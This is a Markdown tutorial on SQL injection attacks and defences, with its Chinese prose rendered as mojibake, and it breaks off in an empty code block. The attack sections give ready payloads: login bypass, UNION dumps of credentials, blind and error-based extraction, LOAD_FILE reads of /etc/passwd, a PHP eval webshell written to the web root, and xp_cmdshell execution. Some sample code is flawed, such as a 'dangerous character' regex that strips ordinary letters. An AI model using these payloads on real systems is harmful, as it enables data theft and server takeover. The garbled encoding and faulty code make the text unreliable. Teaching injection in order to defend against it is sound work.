---
title: 3ã€SQLæ³¨å…¥æ”»å‡»é˜²æŠ¤ç­–ç•¥
---
## ğŸ“š ç›®å½•

1. [SQLæ³¨å…¥åŸºç¡€åŸç†](#1-SQLæ³¨å…¥åŸºç¡€åŸç†)
2. [SQLæ³¨å…¥æ”»å‡»ç±»å‹è¯¦è§£](#2-SQLæ³¨å…¥æ”»å‡»ç±»å‹è¯¦è§£)
3. [æ³¨å…¥æ”»å‡»é«˜çº§æŠ€å·§](#3-æ³¨å…¥æ”»å‡»é«˜çº§æŠ€å·§)
4. [å‚æ•°åŒ–æŸ¥è¯¢é˜²æŠ¤](#4-å‚æ•°åŒ–æŸ¥è¯¢é˜²æŠ¤)
5. [ORMæ¡†æ¶å®‰å…¨ä½¿ç”¨](#5-ORMæ¡†æ¶å®‰å…¨ä½¿ç”¨)
6. [è¾“å…¥éªŒè¯ä¸è¿‡æ»¤ç­–ç•¥](#6-è¾“å…¥éªŒè¯ä¸è¿‡æ»¤ç­–ç•¥)
7. [æ•°æ®åº“å®‰å…¨é…ç½®](#7-æ•°æ®åº“å®‰å…¨é…ç½®)
8. [æ ¸å¿ƒè¦ç‚¹æ€»ç»“](#8-æ ¸å¿ƒè¦ç‚¹æ€»ç»“)

---

## 1. ğŸ” SQLæ³¨å…¥åŸºç¡€åŸç†


### 1.1 ä»€ä¹ˆæ˜¯SQLæ³¨å…¥


**ğŸ¤” é€šä¿—ç†è§£**
æƒ³è±¡ä¸€ä¸‹ï¼Œä½ æœ‰ä¸€ä¸ªæ™ºèƒ½é—¨é”ï¼Œæ­£å¸¸æƒ…å†µä¸‹åªæœ‰è¾“å…¥æ­£ç¡®å¯†ç æ‰èƒ½å¼€é—¨ã€‚ä½†å¦‚æœè¿™ä¸ªé—¨é”è®¾è®¡æœ‰ç¼ºé™·ï¼Œæœ‰äººé€šè¿‡ç‰¹æ®Šçš„"ä¸‡èƒ½é’¥åŒ™"ç»•è¿‡äº†å¯†ç éªŒè¯ç›´æ¥å¼€é—¨ï¼Œè¿™å°±ç±»ä¼¼SQLæ³¨å…¥ã€‚

**ğŸ’» SQLæ³¨å…¥å®šä¹‰**
```
SQLæ³¨å…¥ï¼šæ”»å‡»è€…åœ¨Webåº”ç”¨çš„è¾“å…¥æ¡†ä¸­æ’å…¥æ¶æ„SQLä»£ç ï¼Œ
         è®©è¿™äº›ä»£ç è¢«å½“ä½œæ­£å¸¸SQLè¯­å¥æ‰§è¡Œï¼Œ
         ä»è€Œè·å–ã€ä¿®æ”¹æˆ–åˆ é™¤æ•°æ®åº“ä¸­çš„æ•°æ®ã€‚
```

### 1.2 SQLæ‹¼æ¥æ¼æ´åŸç†


**ğŸ”§ æ¼æ´äº§ç”Ÿçš„æ ¹æœ¬åŸå› **

```java
// âŒ å±é™©çš„SQLæ‹¼æ¥æ–¹å¼
String username = request.getParameter("username");
String password = request.getParameter("password");

// ç›´æ¥å°†ç”¨æˆ·è¾“å…¥æ‹¼æ¥åˆ°SQLè¯­å¥ä¸­
String sql = "SELECT * FROM users WHERE username='" + username + 
             "' AND password='" + password + "'";
```

**ğŸš¨ æ”»å‡»è€…å¦‚ä½•åˆ©ç”¨**

```
æ­£å¸¸ç”¨æˆ·è¾“å…¥ï¼š
username: admin
password: 123456

ç”Ÿæˆçš„SQLï¼š
SELECT * FROM users WHERE username='admin' AND password='123456'

æ”»å‡»è€…è¾“å…¥ï¼š
username: admin' --
password: ä»»æ„å†…å®¹

ç”Ÿæˆçš„SQLï¼š
SELECT * FROM users WHERE username='admin' -- ' AND password='ä»»æ„å†…å®¹'
```

**ğŸ’¡ å…³é”®ç†è§£ç‚¹**
- `--` æ˜¯SQLæ³¨é‡Šç¬¦ï¼Œä¼šè®©åé¢çš„å†…å®¹è¢«å¿½ç•¥
- å•å¼•å· `'` ç”¨æ¥é—­åˆå­—ç¬¦ä¸²ï¼Œç ´ååŸæœ‰SQLç»“æ„
- æ”»å‡»è€…å·§å¦™åˆ©ç”¨äº†SQLè¯­æ³•ç‰¹æ€§

### 1.3 æ¶æ„SQLä»£ç æ‰§è¡Œè¿‡ç¨‹


**ğŸ“‹ æ³¨å…¥æ‰§è¡Œæµç¨‹**

```
1. ç”¨æˆ·åœ¨ç™»å½•æ¡†è¾“å…¥æ¶æ„ä»£ç 
   â†“
2. æœåŠ¡å™¨æ¥æ”¶è¾“å…¥å¹¶æ‹¼æ¥SQL
   â†“  
3. æ•°æ®åº“æ‰§è¡ŒåŒ…å«æ¶æ„ä»£ç çš„SQL
   â†“
4. æ”»å‡»è€…è·å¾—éæ³•è®¿é—®æƒé™
```

**ğŸ¯ æ³¨å…¥ç‚¹è¯†åˆ«æ–¹æ³•**

```
å¸¸è§çš„æ³¨å…¥ç‚¹ï¼š
âœ… ç™»å½•è¡¨å•çš„ç”¨æˆ·å/å¯†ç æ¡†
âœ… æœç´¢æ¡†
âœ… URLå‚æ•°ï¼ˆå¦‚ ?id=1&name=testï¼‰
âœ… HTTPå¤´éƒ¨å­—æ®µ
âœ… Cookieå€¼
```

### 1.4 ç»å…¸æ³¨å…¥æ¡ˆä¾‹åˆ†æ


**ğŸ“ ç™»å½•ç»•è¿‡å®ä¾‹**

```java
// è„†å¼±çš„ç™»å½•éªŒè¯ä»£ç 
public boolean login(String username, String password) {
    String sql = "SELECT * FROM users WHERE username='" + username + 
                 "' AND password='" + password + "'";
    
    ResultSet rs = statement.executeQuery(sql);
    return rs.next(); // æœ‰ç»“æœå°±è®¤ä¸ºç™»å½•æˆåŠŸ
}
```

**âš”ï¸ æ”»å‡»è€…è¾“å…¥**
```
ç”¨æˆ·åï¼šadmin' OR '1'='1
å¯†ç ï¼šéšä¾¿è¾“å…¥

å®é™…æ‰§è¡Œçš„SQLï¼š
SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='éšä¾¿è¾“å…¥'

ç»“æœï¼šç”±äº '1'='1' æ°¸è¿œä¸ºçœŸï¼ŒæŸ¥è¯¢æ€»æ˜¯è¿”å›ç»“æœï¼Œæ”»å‡»è€…æˆåŠŸç™»å½•ï¼
```

---

## 2. ğŸ¯ SQLæ³¨å…¥æ”»å‡»ç±»å‹è¯¦è§£


### 2.1 Unionè”åˆæ³¨å…¥


**ğŸ”— Unionæ³¨å…¥åŸç†**
Unionæ³¨å…¥åˆ©ç”¨SQLçš„UNIONè¯­å¥å°†å¤šä¸ªæŸ¥è¯¢ç»“æœåˆå¹¶ï¼Œæ”»å‡»è€…å¯ä»¥ä»å…¶ä»–è¡¨ä¸­è·å–æ•°æ®ã€‚

**ğŸ’» Unionæ³¨å…¥å®ç°æ­¥éª¤**

```sql
-- ç¬¬ä¸€æ­¥ï¼šåˆ¤æ–­åˆ—æ•°
' UNION SELECT 1 --
' UNION SELECT 1,2 --
' UNION SELECT 1,2,3 -- (ç›´åˆ°ä¸æŠ¥é”™ä¸ºæ­¢)

-- ç¬¬äºŒæ­¥ï¼šç¡®å®šæ˜¾ç¤ºä½ç½®
' UNION SELECT 1,'HACK',3 --

-- ç¬¬ä¸‰æ­¥ï¼šè·å–æ•æ„Ÿä¿¡æ¯
' UNION SELECT 1,username,password FROM admin --
```

**ğŸ¯ å®é™…æ”»å‡»åœºæ™¯**
```java
// è„†å¼±çš„å•†å“æŸ¥è¯¢
String productId = request.getParameter("id");
String sql = "SELECT name,price,description FROM products WHERE id=" + productId;

// æ”»å‡»è€…è¾“å…¥ï¼š1 UNION SELECT username,password,email FROM users
// ç»“æœï¼šåœ¨å•†å“ä¿¡æ¯ä¸­æ··å…¥äº†ç”¨æˆ·è´¦å·å¯†ç ï¼
```

### 2.2 å¸ƒå°”ç›²æ³¨è¯¦è§£


**ğŸ•µï¸ ä»€ä¹ˆæ˜¯å¸ƒå°”ç›²æ³¨**
å½“é¡µé¢ä¸ç›´æ¥æ˜¾ç¤ºæŸ¥è¯¢ç»“æœï¼Œåªæ˜¾ç¤º"æˆåŠŸ"æˆ–"å¤±è´¥"æ—¶ï¼Œæ”»å‡»è€…é€šè¿‡æ„é€ çœŸ/å‡æ¡ä»¶æ¥é€æ­¥çŒœæµ‹æ•°æ®ã€‚

**ğŸ” å¸ƒå°”ç›²æ³¨æŠ€å·§**

```sql
-- çŒœæµ‹æ•°æ®åº“åç§°é•¿åº¦
' AND LENGTH(DATABASE())=8 --

-- é€ä¸ªå­—ç¬¦çŒœæµ‹æ•°æ®åº“å
' AND SUBSTRING(DATABASE(),1,1)='t' --  (çŒœç¬¬1ä¸ªå­—ç¬¦æ˜¯å¦ä¸º't')
' AND SUBSTRING(DATABASE(),2,1)='e' --  (çŒœç¬¬2ä¸ªå­—ç¬¦æ˜¯å¦ä¸º'e')

-- çŒœæµ‹è¡¨å
' AND (SELECT COUNT(*) FROM information_schema.tables 
      WHERE table_schema=DATABASE() AND table_name LIKE 'user%')>0 --
```

**â° å®é™…ç›²æ³¨è¿‡ç¨‹**
```
å‡è®¾è¦çŒœæµ‹ç®¡ç†å‘˜ç”¨æˆ·åï¼š

é¡µé¢æ­£å¸¸æ˜¾ç¤º â†’ ' AND SUBSTRING((SELECT username FROM admin LIMIT 1),1,1)='a' -- 
é¡µé¢æ­£å¸¸æ˜¾ç¤º â†’ ' AND SUBSTRING((SELECT username FROM admin LIMIT 1),2,1)='d' --
é¡µé¢æ­£å¸¸æ˜¾ç¤º â†’ ' AND SUBSTRING((SELECT username FROM admin LIMIT 1),3,1)='m' --

é€æ­¥å¾—å‡ºï¼šadmin
```

### 2.3 æ—¶é—´ç›²æ³¨è¯¦è§£


**â±ï¸ æ—¶é—´ç›²æ³¨åŸç†**
å½“é¡µé¢æ— è®ºè¾“å…¥ä»€ä¹ˆéƒ½æ˜¾ç¤ºç›¸åŒå†…å®¹æ—¶ï¼Œæ”»å‡»è€…åˆ©ç”¨æ•°æ®åº“çš„å»¶æ—¶å‡½æ•°ï¼Œé€šè¿‡å“åº”æ—¶é—´æ¥åˆ¤æ–­æ³¨å…¥æ˜¯å¦æˆåŠŸã€‚

**ğŸ• æ—¶é—´ç›²æ³¨å®ç°**

```sql
-- MySQLæ—¶é—´å»¶è¿Ÿ
' AND IF(LENGTH(DATABASE())=8, SLEEP(5), 0) --

-- å¦‚æœæ•°æ®åº“åé•¿åº¦æ˜¯8ï¼Œé¡µé¢ä¼šå»¶è¿Ÿ5ç§’å“åº”
-- å¦‚æœä¸æ˜¯8ï¼Œç«‹å³å“åº”

-- é€å­—ç¬¦çŒœæµ‹
' AND IF(SUBSTRING(DATABASE(),1,1)='t', SLEEP(3), 0) --
```

**ğŸ“Š æ—¶é—´ç›²æ³¨ç‰¹ç‚¹**
```
ä¼˜ç‚¹ï¼šé€‚ç”¨äºä»»ä½•SQLæ³¨å…¥åœºæ™¯
ç¼ºç‚¹ï¼šé€Ÿåº¦å¾ˆæ…¢ï¼Œå®¹æ˜“è¢«æ£€æµ‹
åº”ç”¨ï¼šå½“å…¶ä»–æ³¨å…¥æ–¹å¼éƒ½å¤±æ•ˆæ—¶çš„æœ€åæ‰‹æ®µ
```

### 2.4 Error-basedæ³¨å…¥


**ğŸ’¥ é”™è¯¯ä¿¡æ¯æ³¨å…¥**
åˆ©ç”¨æ•°æ®åº“çš„é”™è¯¯ä¿¡æ¯æ¥è·å–æ•æ„Ÿæ•°æ®ï¼Œå¸¸è§äºå¼€å‘ç¯å¢ƒæˆ–é…ç½®ä¸å½“çš„ç”Ÿäº§ç¯å¢ƒã€‚

**ğŸ” å¸¸ç”¨Error-basedæŠ€å·§**

```sql
-- MySQLæŠ¥é”™æ³¨å…¥
' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)x 
       GROUP BY CONCAT(VERSION(),FLOOR(RAND(0)*2))) --

-- åˆ©ç”¨duplicate keyé”™è¯¯
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x 
       FROM information_schema.tables GROUP BY x)a) --
```

---

## 3. âš”ï¸ æ³¨å…¥æ”»å‡»é«˜çº§æŠ€å·§


### 3.1 æ•°æ®åº“ç»“æ„æ¢æµ‹


**ğŸ” ç³»ç»Ÿè¡¨ä¿¡æ¯æ”¶é›†**

```sql
-- MySQLä¿¡æ¯æ¢æµ‹
' UNION SELECT table_name,column_name,1 FROM information_schema.columns 
  WHERE table_schema=DATABASE() --

-- è·å–æ‰€æœ‰è¡¨å
' UNION SELECT GROUP_CONCAT(table_name),1,1 FROM information_schema.tables 
  WHERE table_schema=DATABASE() --

-- è·å–æŒ‡å®šè¡¨çš„å­—æ®µ
' UNION SELECT GROUP_CONCAT(column_name),1,1 FROM information_schema.columns 
  WHERE table_name='users' --
```

**ğŸ¯ æ¢æµ‹ç›®æ ‡**
```
ğŸ“‹ å¿…æ¢ä¿¡æ¯ï¼š
- æ•°æ®åº“ç±»å‹å’Œç‰ˆæœ¬
- æ•°æ®åº“åç§°  
- è¡¨ååˆ—è¡¨
- å­—æ®µååˆ—è¡¨
- æ•æ„Ÿè¡¨ç»“æ„ï¼ˆusersã€adminã€configç­‰ï¼‰
```

### 3.2 æƒé™æå‡ä¸æ–‡ä»¶æ“ä½œ


**ğŸ‘‘ ç®¡ç†å‘˜æƒé™è·å–**

```sql
-- æŸ¥çœ‹å½“å‰ç”¨æˆ·æƒé™
' UNION SELECT USER(),1,1 --
' UNION SELECT $$version,$$datadir,1 --

-- åˆ©ç”¨UDFæå‡æƒé™ï¼ˆéœ€è¦ç‰¹å®šæ¡ä»¶ï¼‰
' UNION SELECT 'shell code',1,1 INTO OUTFILE '/tmp/hack.so' --
```

**ğŸ“ æ–‡ä»¶è¯»å†™æ“ä½œ**

```sql
-- è¯»å–ç³»ç»Ÿæ–‡ä»¶
' UNION SELECT LOAD_FILE('/etc/passwd'),1,1 --
' UNION SELECT LOAD_FILE('C:\\Windows\\system32\\drivers\\etc\\hosts'),1,1 --

-- å†™å…¥æ–‡ä»¶ï¼ˆWebshellï¼‰
' UNION SELECT '<?php eval($_POST[cmd]);?>',1,1 
  INTO OUTFILE '/var/www/html/shell.php' --
```

### 3.3 å‘½ä»¤æ‰§è¡ŒæŠ€å·§


**ğŸš€ ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œ**

```sql
-- MySQL UDFå‘½ä»¤æ‰§è¡Œï¼ˆéœ€è¦é«˜æƒé™ï¼‰
SELECT sys_exec('whoami');
SELECT sys_eval('cat /etc/passwd');

-- é€šè¿‡xp_cmdshellï¼ˆSQL Serverï¼‰
EXEC xp_cmdshell 'dir C:\';
```

**âš ï¸ é‡è¦æé†’**
> è¿™äº›é«˜çº§æŠ€å·§éœ€è¦ç‰¹å®šçš„æ•°æ®åº“æƒé™å’Œç¯å¢ƒé…ç½®ï¼Œåœ¨å®é™…é˜²æŠ¤ä¸­è¦é‡ç‚¹å…³æ³¨æƒé™æ§åˆ¶å’Œæ•æ„ŸåŠŸèƒ½çš„é™åˆ¶ã€‚

---

## 4. ğŸ›¡ï¸ å‚æ•°åŒ–æŸ¥è¯¢é˜²æŠ¤


### 4.1 PreparedStatementæ ¸å¿ƒåŸç†


**ğŸ” å‚æ•°åŒ–æŸ¥è¯¢çš„å®‰å…¨æœºåˆ¶**

```
ä¼ ç»ŸSQLæ‹¼æ¥ï¼šç”¨æˆ·è¾“å…¥ç›´æ¥æˆä¸ºSQLè¯­å¥çš„ä¸€éƒ¨åˆ†
å‚æ•°åŒ–æŸ¥è¯¢ï¼šç”¨æˆ·è¾“å…¥åªä½œä¸ºå‚æ•°å€¼ï¼Œä¸å½±å“SQLç»“æ„

å…³é”®åŒºåˆ«ï¼š
âŒ æ‹¼æ¥ï¼šSQLç»“æ„å¯è¢«ç”¨æˆ·è¾“å…¥æ”¹å˜
âœ… å‚æ•°åŒ–ï¼šSQLç»“æ„å›ºå®šï¼Œç”¨æˆ·è¾“å…¥ä»…ä¸ºæ•°æ®
```

**ğŸ’» å‚æ•°åŒ–æŸ¥è¯¢å®ç°**

```java
// âœ… å®‰å…¨çš„å‚æ•°åŒ–æŸ¥è¯¢
public User login(String username, String password) {
    String sql = "SELECT * FROM users WHERE username=? AND password=?";
    
    try (PreparedStatement pst = connection.prepareStatement(sql)) {
        pst.setString(1, username);  // ç¬¬1ä¸ª?å·ä½ç½®
        pst.setString(2, password);  // ç¬¬2ä¸ª?å·ä½ç½®
        
        ResultSet rs = pst.executeQuery();
        if (rs.next()) {
            return new User(rs.getString("username"), rs.getString("email"));
        }
    }
    return null;
}
```

### 4.2 å ä½ç¬¦ç»‘å®šæœºåˆ¶


**ğŸ¯ å ä½ç¬¦å·¥ä½œåŸç†**

```java
// è¯¦ç»†çš„å‚æ•°ç»‘å®šç¤ºä¾‹
public List<Product> searchProducts(String category, Double minPrice, Double maxPrice) {
    StringBuilder sql = new StringBuilder("SELECT * FROM products WHERE 1=1");
    List<Object> params = new ArrayList<>();
    
    if (category != null && !category.trim().isEmpty()) {
        sql.append(" AND category=?");
        params.add(category);
    }
    
    if (minPrice != null) {
        sql.append(" AND price>=?");
        params.add(minPrice);
    }
    
    if (maxPrice != null) {
        sql.append(" AND price<=?");
        params.add(maxPrice);
    }
    
    try (PreparedStatement pst = connection.prepareStatement(sql.toString())) {
        // åŠ¨æ€ç»‘å®šå‚æ•°
        for (int i = 0; i < params.size(); i++) {
            pst.setObject(i + 1, params.get(i));
        }
        return executeQuery(pst);
    }
}
```

### 4.3 åŠ¨æ€SQLçš„é£é™©ä¸è§£å†³


**âš ï¸ åŠ¨æ€SQLå¸¸è§é”™è¯¯**

```java
// âŒ é”™è¯¯ç¤ºä¾‹ï¼šåŠ¨æ€å­—æ®µå
public List<User> getUsers(String sortField, String sortOrder) {
    // è¿™æ ·ä»ç„¶ä¸å®‰å…¨ï¼å­—æ®µåæ— æ³•å‚æ•°åŒ–
    String sql = "SELECT * FROM users ORDER BY ? ?";
    PreparedStatement pst = connection.prepareStatement(sql);
    pst.setString(1, sortField);  // æ— æ•ˆï¼å­—æ®µåä¸èƒ½ç”¨å ä½ç¬¦
    pst.setString(2, sortOrder);  // æ— æ•ˆï¼
}
```

**âœ… å®‰å…¨çš„åŠ¨æ€SQLå¤„ç†**

```java
// âœ… ç™½åå•éªŒè¯å­—æ®µå
public List<User> getUsers(String sortField, String sortOrder) {
    // ç™½åå•éªŒè¯
    Set<String> allowedFields = Set.of("username", "email", "created_date");
    Set<String> allowedOrders = Set.of("ASC", "DESC");
    
    if (!allowedFields.contains(sortField) || !allowedOrders.contains(sortOrder)) {
        throw new IllegalArgumentException("éæ³•çš„æ’åºå‚æ•°");
    }
    
    // å®‰å…¨æ‹¼æ¥ï¼ˆå·²éªŒè¯çš„ç™½åå•å€¼ï¼‰
    String sql = "SELECT * FROM users ORDER BY " + sortField + " " + sortOrder;
    PreparedStatement pst = connection.prepareStatement(sql);
    return executeQuery(pst);
}
```

---

## 5. ğŸ—ï¸ ORMæ¡†æ¶å®‰å…¨ä½¿ç”¨


### 5.1 Hibernateå®‰å…¨å®è·µ


**ğŸ”’ HQLå‚æ•°åŒ–æŸ¥è¯¢**

```java
// âœ… å®‰å…¨çš„HQLæŸ¥è¯¢
public List<User> findUsersByRole(String roleName) {
    String hql = "FROM User u WHERE u.role.name = :roleName";
    
    Query<User> query = session.createQuery(hql, User.class);
    query.setParameter("roleName", roleName);
    
    return query.getResultList();
}

// âœ… Criteria APIï¼ˆç±»å‹å®‰å…¨ï¼‰
public List<User> findActiveUsers(String email) {
    CriteriaBuilder cb = session.getCriteriaBuilder();
    CriteriaQuery<User> query = cb.createQuery(User.class);
    Root<User> root = query.from(User.class);
    
    query.select(root)
         .where(cb.and(
             cb.equal(root.get("email"), email),
             cb.equal(root.get("active"), true)
         ));
    
    return session.createQuery(query).getResultList();
}
```

**âŒ Hibernateå±é™©ç”¨æ³•**

```java
// âŒ å±é™©ï¼šç›´æ¥SQLæ‹¼æ¥
public User dangerousFind(String username) {
    String sql = "SELECT * FROM users WHERE username='" + username + "'";
    return session.createNativeQuery(sql, User.class).getSingleResult();
}
```

### 5.2 MyBatiså®‰å…¨é…ç½®


**ğŸ›¡ï¸ MyBatiså‚æ•°åŒ–**

```xml
<!-- âœ… å®‰å…¨çš„å‚æ•°åŒ–æŸ¥è¯¢ -->
<select id="findUserByEmail" parameterType="string" resultType="User">
    SELECT * FROM users WHERE email = #{email}
</select>

<select id="findUsersByCondition" parameterType="map" resultType="User">
    SELECT * FROM users 
    WHERE 1=1
    <if test="username != null">
        AND username = #{username}
    </if>
    <if test="status != null">
        AND status = #{status}
    </if>
</select>
```

**âš ï¸ MyBatiså±é™©ç”¨æ³•**

```xml
<!-- âŒ å±é™©ï¼šä½¿ç”¨${}ç›´æ¥æ‹¼æ¥ -->
<select id="dangerousQuery" parameterType="string" resultType="User">
    SELECT * FROM users WHERE username = '${username}'
</select>

<!-- âŒ å±é™©ï¼šåŠ¨æ€è¡¨å/å­—æ®µå -->
<select id="dynamicTable" parameterType="map" resultType="map">
    SELECT * FROM ${tableName} WHERE ${fieldName} = #{value}
</select>
```

**âœ… å®‰å…¨çš„åŠ¨æ€æŸ¥è¯¢**

```java
// åœ¨Javaä»£ç ä¸­éªŒè¯åŠ¨æ€éƒ¨åˆ†
@Service
public class UserService {
    
    private static final Set<String> ALLOWED_SORT_FIELDS = 
        Set.of("username", "email", "created_date");
    
    public List<User> getUsers(String sortField, String sortOrder) {
        // ç™½åå•éªŒè¯
        if (!ALLOWED_SORT_FIELDS.contains(sortField)) {
            sortField = "username"; // é»˜è®¤å€¼
        }
        if (!"DESC".equalsIgnoreCase(sortOrder)) {
            sortOrder = "ASC"; // é»˜è®¤å€¼
        }
        
        Map<String, Object> params = new HashMap<>();
        params.put("sortField", sortField);
        params.put("sortOrder", sortOrder);
        
        return userMapper.getUsersWithSort(params);
    }
}
```

### 5.3 é¿å…ORMåŸç”ŸSQLé£é™©


**ğŸ¯ ORMä½¿ç”¨åŸåˆ™**

```java
// âœ… æ¨èï¼šä¼˜å…ˆä½¿ç”¨ORMæä¾›çš„æŸ¥è¯¢æ–¹æ³•
public List<User> findActiveUsers() {
    return userRepository.findByActiveTrue();
}

// âœ… å¯ä»¥ï¼šå¿…è¦æ—¶ä½¿ç”¨å‚æ•°åŒ–çš„åŸç”ŸSQL
@Query("SELECT u FROM User u WHERE u.email = ?1 AND u.active = true")
List<User> findActiveUserByEmail(String email);

// âŒ é¿å…ï¼šæ‹¼æ¥åŸç”ŸSQL
@Query(value = "SELECT * FROM users WHERE email = '" + "#{email}" + "'", nativeQuery = true)
List<User> dangerousFind(@Param("email") String email);
```

---

## 6. ğŸ” è¾“å…¥éªŒè¯ä¸è¿‡æ»¤ç­–ç•¥


### 6.1 ç™½åå•éªŒè¯ç­–ç•¥


**âœ… ç™½åå•è¿‡æ»¤åŸç†**
```
é»‘åå•æ€ç»´ï¼šåˆ—å‡ºæ‰€æœ‰ä¸å…è®¸çš„è¾“å…¥ï¼ˆå®¹æ˜“é—æ¼ï¼‰
ç™½åå•æ€ç»´ï¼šåªå…è®¸æ˜ç¡®å®‰å…¨çš„è¾“å…¥ï¼ˆæ›´å®‰å…¨ï¼‰

ç™½åå•ä¼˜åŠ¿ï¼š
- é»˜è®¤æ‹’ç»ï¼Œæ˜ç¡®å…è®¸
- ä¸å®¹æ˜“ç»•è¿‡
- æ˜“äºç»´æŠ¤å’Œç†è§£
```

**ğŸ’» ç™½åå•å®ç°ç¤ºä¾‹**

```java
public class InputValidator {
    
    // ç”¨æˆ·åç™½åå•ï¼šåªå…è®¸å­—æ¯æ•°å­—ä¸‹åˆ’çº¿
    private static final Pattern USERNAME_PATTERN = 
        Pattern.compile("^[a-zA-Z0-9_]{3,20}$");
    
    // é‚®ç®±ç™½åå•
    private static final Pattern EMAIL_PATTERN = 
        Pattern.compile("^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$");
    
    // IDç™½åå•ï¼šçº¯æ•°å­—
    private static final Pattern ID_PATTERN = 
        Pattern.compile("^\\d+$");
    
    public boolean isValidUsername(String username) {
        return username != null && USERNAME_PATTERN.matcher(username).matches();
    }
    
    public boolean isValidEmail(String email) {
        return email != null && EMAIL_PATTERN.matcher(email).matches();
    }
    
    public boolean isValidId(String id) {
        return id != null && ID_PATTERN.matcher(id).matches();
    }
}
```

### 6.2 é•¿åº¦é™åˆ¶çš„å…·ä½“å®ç°


**ğŸ“ é•¿åº¦æ§åˆ¶ç­–ç•¥**

```java
public class LengthValidator {
    
    // ä¸åŒå­—æ®µçš„é•¿åº¦é™åˆ¶
    public static final int MAX_USERNAME_LENGTH = 50;
    public static final int MAX_EMAIL_LENGTH = 100;
    public static final int MAX_COMMENT_LENGTH = 500;
    public static final int MIN_PASSWORD_LENGTH = 8;
    
    public ValidationResult validateInput(String fieldName, String value) {
        if (value == null) {
            return ValidationResult.error(fieldName + "ä¸èƒ½ä¸ºç©º");
        }
        
        switch (fieldName) {
            case "username":
                return validateLength(value, 3, MAX_USERNAME_LENGTH, "ç”¨æˆ·å");
            case "email":
                return validateLength(value, 5, MAX_EMAIL_LENGTH, "é‚®ç®±");
            case "comment":
                return validateLength(value, 1, MAX_COMMENT_LENGTH, "è¯„è®º");
            default:
                return ValidationResult.success();
        }
    }
    
    private ValidationResult validateLength(String value, int min, int max, String fieldName) {
        int length = value.length();
        if (length < min) {
            return ValidationResult.error(fieldName + "é•¿åº¦ä¸èƒ½å°‘äº" + min + "ä¸ªå­—ç¬¦");
        }
        if (length > max) {
            return ValidationResult.error(fieldName + "é•¿åº¦ä¸èƒ½è¶…è¿‡" + max + "ä¸ªå­—ç¬¦");
        }
        return ValidationResult.success();
    }
}
```

### 6.3 ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰å¤„ç†


**ğŸ›¡ï¸ å­—ç¬¦è½¬ä¹‰ç­–ç•¥**

```java
public class EscapeUtils {
    
    // HTMLè½¬ä¹‰ï¼ˆé˜²XSSï¼‰
    public static String escapeHtml(String input) {
        if (input == null) return null;
        
        return input.replace("&", "&amp;")
                   .replace("<", "&lt;")
                   .replace(">", "&gt;")
                   .replace("\"", "&quot;")
                   .replace("'", "&#x27;");
    }
    
    // SQLç‰¹æ®Šå­—ç¬¦è½¬ä¹‰ï¼ˆåŒé‡ä¿æŠ¤ï¼‰
    public static String escapeSql(String input) {
        if (input == null) return null;
        
        return input.replace("'", "''")
                   .replace("\\", "\\\\")
                   .replace("%", "\\%")
                   .replace("_", "\\_");
    }
    
    // ç§»é™¤å±é™©å­—ç¬¦
    public static String removeDangerousChars(String input) {
        if (input == null) return null;
        
        // ç§»é™¤SQLæ³¨å…¥å¸¸ç”¨å­—ç¬¦
        return input.replaceAll("[';\"\\-\\-/**/xp_exec]", "");
    }
}
```

### 6.4 æ•°æ®ç±»å‹æ ¡éªŒ


**ğŸ¯ ç±»å‹éªŒè¯å®ç°**

```java
public class TypeValidator {
    
    // æ•´æ•°éªŒè¯
    public static boolean isValidInteger(String value, int min, int max) {
        try {
            int intValue = Integer.parseInt(value);
            return intValue >= min && intValue <= max;
        } catch (NumberFormatException e) {
            return false;
        }
    }
    
    // æ—¥æœŸéªŒè¯
    public static boolean isValidDate(String dateStr, String format) {
        try {
            SimpleDateFormat sdf = new SimpleDateFormat(format);
            sdf.setLenient(false); // ä¸¥æ ¼æ¨¡å¼
            sdf.parse(dateStr);
            return true;
        } catch (ParseException e) {
            return false;
        }
    }
    
    // æšä¸¾å€¼éªŒè¯
    public static boolean isValidEnum(String value, Set<String> allowedValues) {
        return allowedValues.contains(value);
    }
    
    // ç»¼åˆéªŒè¯ç¤ºä¾‹
    public ValidationResult validateUserInput(UserInput input) {
        List<String> errors = new ArrayList<>();
        
        // éªŒè¯ç”¨æˆ·å
        if (!isValidUsername(input.getUsername())) {
            errors.add("ç”¨æˆ·åæ ¼å¼ä¸æ­£ç¡®");
        }
        
        // éªŒè¯å¹´é¾„
        if (!isValidInteger(input.getAge(), 1, 150)) {
            errors.add("å¹´é¾„å¿…é¡»æ˜¯1-150ä¹‹é—´çš„æ•´æ•°");
        }
        
        // éªŒè¯æ€§åˆ«
        Set<String> genders = Set.of("male", "female", "other");
        if (!isValidEnum(input.getGender(), genders)) {
            errors.add("æ€§åˆ«å€¼ä¸æ­£ç¡®");
        }
        
        return errors.isEmpty() ? 
            ValidationResult.success() : 
            ValidationResult.errors(errors);
    }
}
```

---

## 7. ğŸ”’ æ•°æ®åº“å®‰å…¨é…ç½®


### 7.1 æœ€å°æƒé™åŸåˆ™åº”ç”¨


**ğŸ‘¤ ç”¨æˆ·æƒé™åˆ†ç¦»ç­–ç•¥**

```sql
-- åˆ›å»ºä¸“ç”¨çš„åº”ç”¨æ•°æ®åº“ç”¨æˆ·
CREATE USER 'app_read'@'localhost' IDENTIFIED BY 'strong_password_1';
CREATE USER 'app_write'@'localhost' IDENTIFIED BY 'strong_password_2';
CREATE USER 'app_admin'@'localhost' IDENTIFIED BY 'strong_password_3';

-- åªè¯»ç”¨æˆ·æƒé™
GRANT SELECT ON myapp.* TO 'app_read'@'localhost';

-- è¯»å†™ç”¨æˆ·æƒé™ï¼ˆä¸åŒ…æ‹¬DDLï¼‰
GRANT SELECT, INSERT, UPDATE, DELETE ON myapp.* TO 'app_write'@'localhost';

-- ç®¡ç†ç”¨æˆ·æƒé™ï¼ˆDDLæ“ä½œï¼‰
GRANT ALL PRIVILEGES ON myapp.* TO 'app_admin'@'localhost';

-- æ’¤é”€å±é™©æƒé™
REVOKE FILE ON *.* FROM 'app_write'@'localhost';
REVOKE PROCESS ON *.* FROM 'app_write'@'localhost';
REVOKE SUPER ON *.* FROM 'app_write'@'localhost';
```

**ğŸ—ï¸ åº”ç”¨å±‚æƒé™æ§åˆ¶**

```java
